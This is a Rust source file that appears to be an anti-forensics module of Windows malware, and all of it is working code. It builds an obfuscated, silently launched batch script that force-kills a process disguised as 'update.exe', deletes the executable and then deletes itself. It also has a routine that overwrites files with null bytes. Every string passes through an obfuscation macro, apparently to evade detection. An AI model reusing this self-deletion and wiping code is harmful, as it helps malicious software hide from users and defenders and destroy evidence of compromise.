use crate::sprotect;
use std::process::Command;
use std::path::PathBuf;
use std::fs;
use std::io::Write;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

pub fn self_delete_and_exit(exe_path: &PathBuf) -> Result<(), String> {
    let temp_dir = std::env::temp_dir();
    let uuid_str = uuid::Uuid::new_v4().to_string().replace(&sprotect!("-"), &sprotect!(""));
    let batch_name = format!("{}{}", uuid_str, sprotect!(".bat"));
    let batch_path = temp_dir.join(&batch_name);
    
    let exe_path_str = exe_path.to_string_lossy().to_string();
    
    let batch_content = format!(
        "{}\r\n\
        {}\r\n\
        {} {} {} {} {} {}\r\n\
        {} {} {} {} {} {}\r\n\
        {} {} {} {} {} {}\r\n\
        {} {} {} {} {}\r\n\
        {} {} {} {} {} {}\r\n\
        {}\r\n",
        sprotect!("@echo off"),
        sprotect!(":loop"),
        sprotect!("timeout"), sprotect!("/t"), sprotect!("2"), sprotect!("/nobreak"), sprotect!(">nul"), sprotect!("2>&1"),
        sprotect!("taskkill"), sprotect!("/F"), sprotect!("/IM"), sprotect!("update.exe"), sprotect!(">nul"), sprotect!("2>&1"),
        sprotect!("del"), sprotect!("/F"), sprotect!("/Q"), format!("\"{}\"", exe_path_str), sprotect!(">nul"), sprotect!("2>&1"),
        sprotect!("if"), sprotect!("exist"), format!("\"{}\"", exe_path_str), sprotect!("goto"), sprotect!("loop"),
        sprotect!("del"), sprotect!("/F"), sprotect!("/Q"), sprotect!("\"%~f0\""), sprotect!(">nul"), sprotect!("2>&1"),
        sprotect!("exit")
    );
    
    if let Ok(mut file) = fs::File::create(&batch_path) {
        if file.write_all(batch_content.as_bytes()).is_err() {
            return Err(sprotect!("Failed to write batch file").to_string());
        }
    } else {
        return Err(sprotect!("Failed to create batch file").to_string());
    }
    
    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        
        let result = Command::new(sprotect!("cmd.exe"))
            .args([&sprotect!("/c"), &batch_path.to_string_lossy().to_string()])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
        
        if result.is_ok() {
            std::process::exit(0);
        } else {
            return Err(sprotect!("Failed to spawn delete batch").to_string());
        }
    }
    
    #[cfg(not(windows))]
    {
        Err(sprotect!("Self-delete only supported on Windows").to_string())
    }
}

pub fn overwrite_with_nulls(path: &PathBuf) -> Result<(), String> {
    use std::fs::OpenOptions;
    
    if let Ok(metadata) = fs::metadata(path) {
        let file_size = metadata.len() as usize;
        
        if let Ok(mut file) = OpenOptions::new().write(true).open(path) {
            let null_bytes = vec![0u8; file_size];
            
            if file.write_all(&null_bytes).is_ok() {
                let _ = file.sync_all();
                return Ok(());
            }
        }
    }
    
    Err(sprotect!("Failed to overwrite file").to_string())
}


